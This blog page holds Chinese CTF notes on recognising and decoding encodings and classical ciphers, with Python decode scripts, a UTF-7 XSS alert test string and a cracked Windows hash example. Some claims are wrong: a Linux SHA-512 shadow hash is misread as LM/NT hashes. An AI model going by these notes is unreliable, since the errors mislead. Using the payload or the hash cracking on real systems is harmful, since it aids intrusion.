<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>zhiliya</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="emmmm 感觉没啥好说的">
<meta property="og:type" content="website">
<meta property="og:title" content="zhiliya">
<meta property="og:url" content="http://yoursite.com/page/4/index.html">
<meta property="og:site_name" content="zhiliya">
<meta property="og:description" content="emmmm 感觉没啥好说的">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="zhiliya">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="zhiliya" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 4.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">zhiliya</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="/" id="subtitle">欢迎访问我的博客</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-深入浅出密码学-常用加密技术原理与应用" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/11/16/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AF%86%E7%A0%81%E5%AD%A6-%E5%B8%B8%E7%94%A8%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8/" class="article-date">
  <time datetime="2019-11-16T00:32:48.000Z" itemprop="datePublished">2019-11-16</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/">密码学</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/11/16/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AF%86%E7%A0%81%E5%AD%A6-%E5%B8%B8%E7%94%A8%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8/">深入浅出密码学--常用加密技术原理与应用</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><img src="/2019/11/16/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AF%86%E7%A0%81%E5%AD%A6-%E5%B8%B8%E7%94%A8%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8/image-20191116083356655.png" alt="image-20191116083356655"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/11/16/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AF%86%E7%A0%81%E5%AD%A6-%E5%B8%B8%E7%94%A8%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8/" data-id="clmvmvopc001y1s7k1is89m6d" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" rel="tag">密码学</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-密码学" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/11/15/%E5%AF%86%E7%A0%81%E5%AD%A6/" class="article-date">
  <time datetime="2019-11-15T08:55:12.000Z" itemprop="datePublished">2019-11-15</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/">密码学</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/11/15/%E5%AF%86%E7%A0%81%E5%AD%A6/">密码学</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <ul>
<li><p><a href="http://rumkin.com/tools/cipher/baconian.php" target="_blank" rel="noopener">培根密码</a>：  一般大写</p>
</li>
<li><p>邮件头 可打印字符编码：Quoted_Printable <a href="http://www.mxcz.net/tools/QuotedPrintable.aspx" target="_blank" rel="noopener">http://www.mxcz.net/tools/QuotedPrintable.aspx</a></p>
</li>
<li><p>base64 和Rabbit？？？？？？？？？长得像</p>
</li>
<li><p>AES对称加密算法加密的，加密后的密文都是以U2FsdGVkX开头<br><strong>2-9 和 a-f，先用 Base16</strong><br> <strong>A-Z 只有大写字母 和数字 2-7，base32</strong><br> <strong>大小写都有，而且有 “=”，用 base64</strong></p>
</li>
<li><p>xxencode:  LNalVNrhIO4ZnLqZnLpVsAqtXA4FZTEc+ 密文长度为 33 位<br>采用的是 xxencode 加密</p>
</li>
<li><p>摩斯电码:一般弄出来都是大写的</p>
</li>
</ul>
<ul>
<li><p>如果密文是十进制，字符范围为“0-9”，可以猜测是ASCII编码；</p>
</li>
<li><p>如果密文由“a-z”“A-Z”和“=”构成，特别是末尾有“=”，那么可以判断为Base64编码；</p>
</li>
<li><p>如果密文含有“%” ，形式为 “%xx” 和 “%uxxxx”，字符范围又是十六进制“0-F”，判断是escape() 函数编码，用unescape()解码；</p>
</li>
<li><p>若密文由“[]，()，{}，+,！”字符组成的编码通常就通过Jother解密。</p>
</li>
<li><h4 id="如何区分Html编码与Unicode编码？"><a href="#如何区分Html编码与Unicode编码？" class="headerlink" title="如何区分Html编码与Unicode编码？"></a><strong>如何区分Html编码与Unicode编码？</strong></h4><p>Unicode都以&amp;#10结尾</p>
</li>
</ul>
<h4 id="jsfuck"><a href="#jsfuck" class="headerlink" title="jsfuck"></a>jsfuck</h4><p>密文中 ()[]{}!+</p>
<p><a href="https://link.jianshu.com/?t=www.jsfuck.com" target="_blank" rel="noopener">在线解密</a></p>
<p><a href="https://link.jianshu.com/?t=http://patriciopalladino.com/files/hieroglyphy/" target="_blank" rel="noopener">在线解密</a></p>
<p>如果jsfuck定义的是一个函数并且最后以()结尾，则在火狐console中运行时函数也会运行，就会错掉什么提示。这时候需要把最后的()换成.toString()</p>
<ul>
<li><h4 id="Unicode编码"><a href="#Unicode编码" class="headerlink" title="Unicode编码"></a>Unicode编码</h4></li>
</ul>
<blockquote>
<p>Unicode编码有以下四种编码方式：<br> 源文本： The<br>&amp; #x [Hex]： The<br>&amp; # [Decimal]： The<br> \U [Hex]： \U0054\U0068\U0065<br> \U+ [Hex]： \U+0054\U+0068\U+0065</p>
</blockquote>
<h4 id="Utf-7编解码"><a href="#Utf-7编解码" class="headerlink" title="Utf-7编解码"></a>Utf-7编解码</h4><p>原文：gdfgdfg</p>
<p>密文：+AGcAZABmAGcAZABmAGc-</p>
<p>无论何种，都是+开头-结尾</p>
<p><a href="https://link.jianshu.com/?t=http://tomeko.net/online_tools/base32.php?lang=en" target="_blank" rel="noopener">在线解密</a></p>
<h4 id="URL编码："><a href="#URL编码：" class="headerlink" title="URL编码："></a>URL编码：</h4><p>url编码又叫百分号编码，是统一资源定位(URL)编码方式。<br> 编码方法很简单，在该字节ascii码的的16进制字符前面加%。</p>
<h4 id="曼彻斯特"><a href="#曼彻斯特" class="headerlink" title="曼彻斯特"></a>曼彻斯特</h4><p>转二进制 不是10就是01 即是曼彻斯特 解密看脚本</p>
<h4 id="字母频率"><a href="#字母频率" class="headerlink" title="字母频率"></a>字母频率</h4><p>　　频率分析法可以有效的破解单字母替换密码。<br>关于词频问题的密码，我在这里提供英文字母的出现频率给大家，其中数字全部是出现的百分比：<br>　　a 8.2 b 1.5 c 2.8 d 4.3<br>　　e 12.7 f 2.2 g 2.0 h 6.1<br>　　i 7.0 j 0.2 k 0.8 l 4.0<br>　　m 2.4 n 6.7 o 7.5 p 1.9<br>　　q 0.1 r 6.0 s 6.3 t 9.1<br>　　u 2.8 v 1.0 w 2.4 x 0.2<br>　　y 2.0 z 0.1</p>
<blockquote>
<p>在单表代换中，明密文一一对应。所以说，一般有两种方式来进行破解：密钥空间小时可采用暴力破解；密文长度足够长时，使用词频分析（字母：E&gt;T&gt;A&gt;O&gt;I，词组：the&gt;ing&gt;and&gt;her&gt;e，在线分析：<a href="https://link.jianshu.com/?t=http%3A%2F%2Fquipqiup.com%2F" target="_blank" rel="noopener">http://quipqiup.com/</a> ）</p>
</blockquote>
<h4 id="现代密码"><a href="#现代密码" class="headerlink" title="现代密码"></a>现代密码</h4><p> 现代密码学又可以简单的分为以下几个方面：<br> 对称密码，以 DES，AES，RC4 为代表<br> 非对称密码，以 RSA，椭圆曲线加密为代表<br>HASH，以 MD5，SHA1，SHA512 等为代表<br> 数字签名，以 RSA 签名，ElGamal 签名，DSA 签名为代表<br> 其加密方式主要有两种方式：块加密、流加密</p>
<h4 id="ascii"><a href="#ascii" class="headerlink" title="ascii"></a>ascii</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0～31及127(共33个)是控制字符或通信专用字符（其余为可显示字符）；</span><br><span class="line">32～126(共95个)是字符(32是空格），其中48～57为0到9十个阿拉伯数字；</span><br><span class="line">65～90为26个大写英文字母，97～122号为26个小写英文字母，其余为一些标点符号、运算符号等</span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/15/%E5%AF%86%E7%A0%81%E5%AD%A6/6277797-0d62cc02ad8800c7.gif" alt="6277797-0d62cc02ad8800c7"></p>
<blockquote>
<p>0.md5(只包含数字(0-9)和字母（a-f）,长度为16或32)<br>注意长度，字符和替换<br>#utf-7<br>    密文：+/v+ +ADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAiAGsAZQB5ADoALwAlAG4AcwBmAG8AYwB1AHMAWABTAFMAdABlAHMAdAAlAC8AIgApADwALwBzAGMAcgBpAHAAdAA+AC0-</p>
<pre><code>+Axxxxxxxxx- 是 UTF-7 编码的特殊格式。所以只取+ADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAiAGsAZQB5ADoALwAlAG4AcwBmAG8AYwB1AHMAWABTAFMAdABlAHMAdAAlAC8AIgApADwALwBzAGMAcgBpAHAAdAA+AC0-
解码得到&lt;script&gt;alert(&quot;key:/%nsfocusXSStest%/&quot;)&lt;/script&gt;-</code></pre><p><a href="http://toolswebtop.com/text/process/decode/UTF-7" target="_blank" rel="noopener">http://toolswebtop.com/text/process/decode/UTF-7</a><br>00.Windows hash<br>    附件如下<br>    nick:1003:8EA9109FDA91D6BFC6EBE8776A153FEB:C6002D00F57F9F399B6263D714AF8C3A:::<br>    Tips：LMHASH，NTHASH，Ophcrack可知这是windows的hash密码<br>    Windows系统下的hash密码格式为：用户名称:RID:LM-HASH值:NT-HASH值，例如：<br>    nick:1003:8EA9109FDA91D6BFC6EBE8776A153FEB:C6002D00F57F9F399B6263D714AF8C3A:::<br>    8EA9109FDA91D6BFC6EBE8776A153FEB:C6002D00F57F9F399B6263D714AF8C3A解码后就是密码<br>    用户名称为：nick<br>    RID为：1003<br>    LM-HASH值为：8EA9109FDA91D6BFC6EBE8776A153FEB<br>    NT-HASH值为：C6002D00F57F9F399B6263D714AF8C3A<br>    在<a href="http://www.objectif-securite.ch/en/ophcrack.php解密的passwd为hacker521，登陆就能得到flag" target="_blank" rel="noopener">http://www.objectif-securite.ch/en/ophcrack.php解密的passwd为hacker521，登陆就能得到flag</a><br>    root:$6$HRMJoyGA$26FIgg6CU0bGUOfqFB0Qo9AE2LRZxG8N3H.3BK8t49wGlYbkFbxVFtGOZqVIq3qQ6k0oetDbn2aVzdhuVQ6US.:17770:0:99999:7:::<br>    用户名root<br>    RID 6<br>    LM-HASH值为26FIgg6CU0bGUOfqFB0Qo9AE2LRZxG8N3H<br>    NT-HASH  3BK8t49wGlYbkFbxVFtGOZqVIq3qQ6k0oetDbn2aVzdhuVQ6US</p>
<p>1.ASCII编码<br>    ASCII编码大致可以分作三部分组成：<br>    第一部分是：ASCII非打印控制字符（参详ASCII码表中0-31）;<br>    第二部分是：ASCII打印字符，也就是CTF中常用到的转换;<br>#例题/；从一个二维码里扫到一串数字<br>46 45 46 32 45 32 46 46 45 46 32 46 45 46 46 32 46 46 46 32 45 46 46 46 32 46 46 45 45 46 45 32 45 46 46 46 32 46 46 46 32 46 45 46 46 32?<br>    看起来像是ascii，根据ascii表解码得到了这些：<br>    EFEF2E2FFEF2FEFF2FFF2EFFF2FFEEFE2EFFF2FFF2FEFF2<br>    如果把2看成是断开，那么就得到<br>    EFEF<br>    E<br>    FFEF<br>    FEFF<br>    FFF<br>    EFFF<br>    FFEEFE<br>    EFFF<br>    FFF<br>    FEFF<br>    看起来很像摩斯码吧，E是—，F是.        于是解密就得到CTFnullSBnullBSL<br>2.Base64/32/16编码<br>    编码原理：Base64编码要求把3个8位字节转化为4个6位的字节，之后在6位的前面补两个0，形成8位一个字节的形式，6位2进制能表示的最大数是2的6次方是64，<br>    这也是为什么是64个字符(A-Z,a-z，0-9，+，/这64个编码字符，=号不属于编码字符，而是填充字符)的原因<br>    #如果decode后发现变空白了，说明有问题，这种的一般都是=的问题，尝试增减=，发现加两个=时有变化：<br>    Key1一看就是标准的base全家桶，but 两种base64解出来是乱码啊，base32总是解不出来，这里涉及到python语法（<a href="http://zhidao.baidu.com/link?url=d4lCkOsTA0RmtoKdb_-9DI2mnmPIJWPoWMvoL-jRANYzq4cZp1wPPw1yvviZo2jeY6Ki8Ds8B4834YShiTlmr_）" target="_blank" rel="noopener">http://zhidao.baidu.com/link?url=d4lCkOsTA0RmtoKdb_-9DI2mnmPIJWPoWMvoL-jRANYzq4cZp1wPPw1yvviZo2jeY6Ki8Ds8B4834YShiTlmr_）</a><br>    &gt;&gt;&gt; a = ‘DaoChangcloud01’<br>    &gt;&gt;&gt; import base64<br>    &gt;&gt;&gt; b = base64.b32encode(a)<br>    &gt;&gt;&gt; print b<br>    IRQW6Q3IMFXGOY3MN52WIMBR<br>    &gt;&gt;&gt; c = base64.b32decode(b, True)<br>    &gt;&gt;&gt; print c<br>    DaoChangcloud01<br>    &gt;&gt;&gt; c1=’IRQW6Q3IMFXGOY3MN52WIMBr’ #这里最后一个字母改成小写测试<br>    &gt;&gt;&gt; base64.b32decode(c1, True)<br>    ‘DaoChangcloud01’<br>    &gt;&gt;&gt; base64.b32decode(c1, False)<br>    Traceback (most recent call last):<br>      File “<stdin>“, line 1, in <module><br>      File “D:\Python26\lib\base64.py”, line 222, in b32decode<br>        raise TypeError(‘Non-base32 digit found’)<br>    TypeError: Non-base32 digit found<br>    最终decod出来Comeon2012baby 提交后得到key2 :2tHEWinNer<br>        #base混合解密<br>            import base64<br>        file = open(‘base.txt’,’r’)<br>        st = file.read()<br>        while True:<br>           try:<br>               st = base64.b16decode(st)<br>           except:<br>               try:<br>                   st = base64.b32decode(st)<br>               except:<br>                   st = base64.b64decode(st)<br>           if(st.find(‘flag’) == 0):<br>               print(st)</module></stdin></p>
<p>3.shellcode编码<br>#!shell<br>\x54\x68\x65\x7f\x71\x75\x69\x63\x6b\x7f\x62\x72\x6f\x77\x6e\x7f\x66\x6f\x78\x7f\x6a\x75\x6d\x70\x73\x7f\x6f\x76\x65\x72\x7f\x74\x68\x65\x7f\x6c\x61\x7a\x79\x7f\x64\x6f\x67<br>4.Quoted-printable 编码<br>#!shell<br>=E6=95=8F=E6=8D=B7=E7=9A=84=E6=A3=95=E8=89=B2=E7=8B=90=E7=8B=B8=E8=B7=B3=E8<br>=BF=87=E4=BA=86=E6=87=92=E6=83=B0=E7=9A=84=E7=8B=97<br>5.XXencode编码<br>它所选择的可打印字符是：+-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz，一共64个字符。跟base64打印字符相比，就是XXencode多一个“-” 字符，少一个”/” 字符。<br>6.UUencode编码<br>UUencode所产生的结果刚好落在ASCII字符集中可打印字符（32-空白…95-底线）<br>源文本： The quick brown fox jumps over the lazy dog<br>编码后： M5&amp;AE(‘%U:6-K(&amp;)R;W=N(&amp;9O&gt;”!J=6UP&lt;R!O=F5R(‘1H92!L87IY(&amp;1O9PH*<br><a href="http://www.qqxiuzi.cn/bianma/uuencode.php" target="_blank" rel="noopener">http://www.qqxiuzi.cn/bianma/uuencode.php</a><br>7.URL编码<br>在该字节ascii码的的16进制字符前面加%. 如 空格字符，ascii码是32，对应16进制是’20’，那么urlencode编码结果是:%20。<br>#!shell<br>%54%68%65%20%71%75%69%63%6b%20%62%72%6f%77%6e%20%66%6f%78%20%6a%75%6d%70%73%20%6f%76%65%72%20%74%68%65%20%6c%61%7a%79%20%64%6f%67<br>8.Unicode编码<br>有如下四种编码方式<br>源文本： The<br>&amp;#x [Hex]： &#x0054;&#x0068;&#x0065;<br>&amp;# [Decimal]： &#00084;&#00104;&#00101;<br>\U [Hex]： \U0054\U0068\U0065<br>\U+ [Hex]： \U+0054\U+0068\U+0065<br>9.Escape/Unescape编码<br>    Escape/Unescape加密解码/编码解码,又叫%u编码，采用UTF-16BE模式， Escape编码/加密,就是字符对应UTF-16 16进制表示方式前面加%u。Unescape解码/解密，就是去掉”%u”后，将16进制字符还原后，由utf-16转码到自己目标字符。如：字符“中”，UTF-16BE是：“6d93”，因此Escape是“%u6d93”。<br>    源文本： The<br>    编码后： %u0054%u0068%u0065<br>10.HTML实体编码<br>    详见<a href="http://www.w3school.com.cn/tags/html_ref_entities.html" target="_blank" rel="noopener">http://www.w3school.com.cn/tags/html_ref_entities.html</a><br>        结果    描述    实体名称   实体编号<br>        “    quotation mark    &quot;    &#34;<br>        ‘    apostrophe        &apos;     &#39;<br>        &amp;    ampersand    &amp;        &amp;<br>        &lt;    less-than    &lt;        &lt;<br>        &gt;    greater-than    &gt;    &gt;<br>11.敲击码<br>    敲击码(Tap code)是一种以非常简单的方式对文本信息进行编码的方法。因该编码对信息通过使用一系列的点击声音来编码而命名，敲击码是基于5×5方格波利比奥斯方阵来实现的，不同点是是用K字母被整合到C中。<br>    敲击码表:<br>    #!shell<br> 2  3  4  5<br>A  B C/K D  E<br>F  G  H  I  J<br>L  M  N  O  P<br>Q  R  S  T  U<br>V  W  X  Y  Z<br>12.莫尔斯电码<br>    摩尔斯电码(Morse Code)是由美国人萨缪尔·摩尔斯在1836年发明的一种时通时断的且通过不同的排列顺序来表达不同英文字母、数字和标点符号的信号代码，摩尔斯电码主要由以下5种它的代码组成：</p>
<pre><code>点（.）
划（-）
每个字符间短的停顿（通常用空格表示停顿）
每个词之间中等的停顿（通常用 / 划分）
以及句子之间长的停顿
摩尔斯电码字母和数字对应表：
#!shell
A  .-    N  -.    .  .-.-.-  +  .-.-.    1  .----
B  -...  O  ---   ,  --..--  _  ..--.-   2  ..---
C  -.-.  P  .--.  :  ---...  $  ...-..-  3  ...--
D  -..   Q  --.-  &quot;  .-..-.  &amp;  .-...    4  ....-
E  .     R  .-.   &apos;  .----.  /  -..-.    5  .....
F  ..-.  S  ...   !  -.-.--              6  -....
G  --.   T  -     ?  ..--..              7  --...
H  ....  U  ..-   @  .--.-.              8  ---..
I  ..    V  ...-  -  -....-              9  ----.
J  .---  W  .--   ;  -.-.-.              0  -----
K  -.-   X  -..-  (  -.--.           
L  .-..  Y  -.--  )  -.--.-          
M  --    Z  --..  =  -...-</code></pre><p>·-·-·-·-·- 表达的意思是调用信号，表示“我有消息发送”<br>#敲击码<br>敲击码(Tap code)是一种以非常简单的方式对文本信息进行编码的方法。因该编码对信息通过使用一系列的点击声音来编码而命名，敲击码是基于5×5方格波利比奥斯方阵来实现的，不同点是是用K字母被整合到C中。<br>#各种文本加密<br>文本加密可以将正常文本内容打乱为不可连读的文字或符号(汉字 数字 字母 音乐符号 国际音标 盲文 韩文 日文 傣文 彝文 箭头符号 花朵符号 俄文)，换行等格式信息也会被清除，达到加密的作用。在进行文本加密时可以设定一个密码，这样只有知道密码的人才能解密文本。密码可以是数字、字母和下划线，最多九位。<br><a href="http://www.qqxiuzi.cn/bianma/wenbenjiami.php" target="_blank" rel="noopener">http://www.qqxiuzi.cn/bianma/wenbenjiami.php</a><br>例如 明文：我爱你<br>     密文：耜懔笫煨证喊==<br>     明文：我爱你<br>     密文：???←?↙??==<br>敲击码表:</p>
<p>#!shell<br> 2  3  4  5<br>A  B C/K D  E<br>F  G  H  I  J<br>L  M  N  O  P<br>Q  R  S  T  U<br>V  W  X  Y  Z</p>
<p>000000000000换位密码<br>1.栅栏密码<br>        栅栏密码(Rail-fence Cipher)就是把要加密的明文分成N个一组，然后把每组的第1个字符组合，每组第2个字符组合…每组的第N(最后一个分组可能不足N个)个字符组合，最后把他们全部连接起来就是密文，这里以2栏栅栏加密为例。<br>    明文： The quick brown fox jumps over the lazy dog<br>    去空格： Thequickbrownfoxjumpsoverthelazydog<br>    分组： Th eq ui ck br ow nf ox ju mp so ve rt he la zy do g<br>    第一组： Teucbonojmsvrhlzdg<br>    第二组： hqikrwfxupoeteayo<br>    密文： Teucbonojmsvrhlzdghqikrwfxupoeteayo1<br>    加解密 传送门<br>2.曲路密码(Curve Cipher)是一种换位密码，需要事先双方约定密钥(也就是曲路路径)。<br>    明文： The quick brown fox jumps over the lazy dog<br>    填入5行7列表(事先约定填充的行列数)<br>3.列移位密码<br>    很有意思<del>，见灵哥的文章<br>000000000000替换加密<br>1.埃特巴什码<br>    埃特巴什码(Atbash Cipher)是一种以字母倒序排列作为特殊密钥的替换加密，也就是下面的对应关系：<br>    ABCDEFGHIJKLMNOPQRSTUVWXYZ<br>    ZYXWVUTSRQPONMLKJIHGFEDCBA<br>    明文： the quick brown fox jumps over the lazy dog<br>    密文： gsv jfrxp yildm ulc qfnkh levi gsv ozab wlt<br>    加解密 <a href="http://www.practicalcryptography.com/ciphers/classical-era/atbash-cipher/" target="_blank" rel="noopener">http://www.practicalcryptography.com/ciphers/classical-era/atbash-cipher/</a><br>2.凯撒密码<br>    凯撒密码(Caesar Cipher或称恺撒加密、恺撒变换、变换加密、位移加密)是一种替换加密，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。例，当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推，更多 参考 。<br>    加解密<a href="http://planetcalc.com/1434/" target="_blank" rel="noopener">http://planetcalc.com/1434/</a><br>    也可使用米斯特的小工具哦</del><br>    vbkq{ukCkS_vrduztucCVQXVuvzuckrvtZDUBTGYSkvcktv}<br>发现是凯撒加密，不过奇偶数移位方向不一样，发现偏移量是16，用脚本跑一下<br>str = “vbkq{ukCkS_vrduztucCVQXVuvzuckrvtZDUBTGYSkvcktv}”<br>for i in range(26):<br>    key = ‘’<br>    for x in str:<br>        s = ord(x)<br>        if (s not in range(97,123)) and (s not in range(65,91)):<br>            key = key + chr(s)<br>        else:<br>            #print chr(s)<br>            if s in range(97,123):<br>                if s % 2 == 0:<br>                    s = s - i<br>                    if s not in range(97,123):<br>                        t = 97-s<br>                        t = 123-t<br>                        key = key + chr(t)<br>                    else:<br>                        key = key + chr(s)<br>                else:<br>                    s = s + i<br>                    if s not in range(97,123):<br>                        t = s-122+96<br>                        key = key + chr(t)<br>                    else:<br>                        key = key + chr(s)<br>            else:<br>                #print chr(s)<br>                if s % 2 == 0:<br>                    s = s - i<br>                    if s not in range(65,91):<br>                        t = 65-s<br>                        t = 91-t<br>                        key = key + chr(t)<br>                    else:<br>                        key = key + chr(s)<br>                else:<br>                    s = s + i<br>                if s not in range(65,91):<br>                        t = s-90+64<br>                        key = key + chr(t)<br>                else:<br>                        key = key + chr(s)<br>    print key<br>3.ROT5/13/18/47<br>    ROT5/13/18/47是一种简单的码元位置顺序替换暗码。此类编码具有可逆性，可以自我解密，主要用于应对快速浏览，或者是机器的读取。<br>    ROT5 是 rotate by 5 places 的简写，意思是旋转5个位置，其它皆同。下面分别说说它们的编码方式：<br>    ROT5：只对数字进行编码，用当前数字往前数的第5个数字替换当前数字，例如当前为0，编码后变成5，当前为1，编码后变成6，以此类推顺序循环。<br>    ROT13：只对字母进行编码，用当前字母往前数的第13个字母替换当前字母，例如当前为A，编码后变成N，当前为B，编码后变成O，以此类推顺序循环。<br>    ROT18：这是一个异类，本来没有，它是将ROT5和ROT13组合在一起，为了好称呼，将其命名为ROT18。<br>    ROT47：对数字、字母、常用符号进行编码，按照它们的ASCII值进行位置替换，用当前字符ASCII值往前数的第47位对应字符替换当前字符，例如当前为小写字母z，编码后变成大写字母K，当前为数字0，编码后变成符号_。用于ROT47编码的字符其ASCII值范围是33－126，具体可参考ASCII编码，下面以rot13以例。<br>    明文： the quick brown fox jumps over the lazy dog<br>    密文： gur dhvpx oebja sbk whzcf bire gur ynml qbt<br>    加解密<a href="http://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php" target="_blank" rel="noopener">http://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php</a><br>4.简单替换密码<br>    简单换位密码(Simple Substitution Cipher)加密方式是以每个明文字母被与之唯一对应且不同的字母替换的方式实现的，<br>    它不同于恺撒密码，因为密码字母表的字母不是简单的移位，而是完全是混乱的。 比如：<br>    #!shell<br>    明文字母 : abcdefghijklmnopqrstuvwxyz<br>    明文字母 : phqgiumeaylnofdxjkrcvstzwb<br>    明文： the quick brown fox jumps over the lazy dog<br>    密文： cei jvaql hkdtf udz yvoxr dsik cei npbw gdm<br>    （2）破解<br>    当密文数据足够多时这种密码我们可以通过字频分析方法破解或其他方法破解，<br>    比较好的在线词频分析网站 <a href="http://quipqiup.com/index.php" target="_blank" rel="noopener">http://quipqiup.com/index.php</a> (翻= =墙)，<br>    这里推荐一篇通过”爬山算法”来破解简单替换密码 文章 ，基于文中的算法实现的工具来破解示例。<br>5.希尔密码–考察你的线性代数咯<br>    解码 <a href="http://www.practicalcryptography.com/ciphers/hill-cipher/" target="_blank" rel="noopener">http://www.practicalcryptography.com/ciphers/hill-cipher/</a><br>#希尔密码<br>密文： 22,09,00,12,03,01,10,03,04,08,01,17 （c）<br>使用的矩阵是 1 2 3 4 5 6 7 8 10<br>请对密文解密.<br>一个希尔密码 老老实实写个Python解密<br>#!/usr/bin/env python</p>
<h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="-- coding: utf-8 --"></a>-<em>- coding: utf-8 -</em>-</h1><p><strong>Url</strong> = ‘Http://<a href="http://www.purpleroc.com&#39;" target="_blank" rel="noopener">www.purpleroc.com&#39;</a><br><strong>author</strong> = ‘Tracy_梓朋’<br>from numpy import *<br>Dic = {chr(i+97):i for i in range(26)}<br>def decode(pwd, org):<br>    temp = []<br>    result = []<br>    while True:<br>        if len(pwd) % 3 != 0:<br>            pwd.append(pwd[-1])<br>        else:<br>            break<br>    for i in pwd:<br>        temp.append(Dic.get(i))<br>    temp = array(temp)<br>    temp = temp.reshape(len(pwd)/3, 3)<br>    #print temp<br>    #print org<br>    xx = matrix(temp)<em>org<br>    for j in range(len(pwd)/3):<br>        for i in range(3):<br>            if (int(xx[j, i]) &gt;= 26):<br>                result.append(chr(xx[j, i] % 26 + 97))<br>                #print xx[j, i] % 26<br>            else:<br>                #print xx[j, i]<br>                result.append(chr(xx[j, i] + 97))<br>    return result<br>def get_vmatrix(org):<br>    org_adjoin = org.I</em>linalg.det(org)<br>    print org_adjoin<br>    org_det = int(str(abs(linalg.det(org))).split(‘.’)[0])<br>    print org_det<br>    for i in range(1, 26):<br>        if i * org_det % 26 == 1:<br>            break<br>    org_mod = -org_adjoin * i % 26<br>    org_mod = matrix(org_mod)<br>    temp = []<br>    for i in range(org_mod.shape[0]):<br>        for j in range(org_mod.shape[1]):<br>            temp.append(int(str(org_mod[i, j]).split(‘.’)[0]))<br>    org_final = matrix(temp).reshape(org_mod.shape[0], org_mod.shape[1])<br>    #print org_final<br>    return org_final<br>if <strong>name</strong> == ‘<strong>main</strong>‘:<br>    ‘’’ for test<br>    pwd = list(“act”)<br>    org = matrix(array([[6, 24, 1], [13 , 16, 10], [20, 17, 15]]))<br>    result = decode(pwd, org)<br>    print “”.join(result)<br>    deorg = matrix(array([[8, 5, 10], [21 , 8, 21], [21, 12, 8]]))<br>    result = decode(result, deorg)<br>    print “”.join(result)<br>    ‘’’<br>    pwd = “wjamdbkdeibr” #密文<br>    pwd = list(pwd)<br>    org = matrix(array([[1,2,3],[4,5,6],[7,8,10]])) #解密矩阵<br>    org_vm = get_vmatrix(org)<br>    print org_vm<br>    print “Your flag is :” + “”.join(decode(pwd, org_vm))</p>
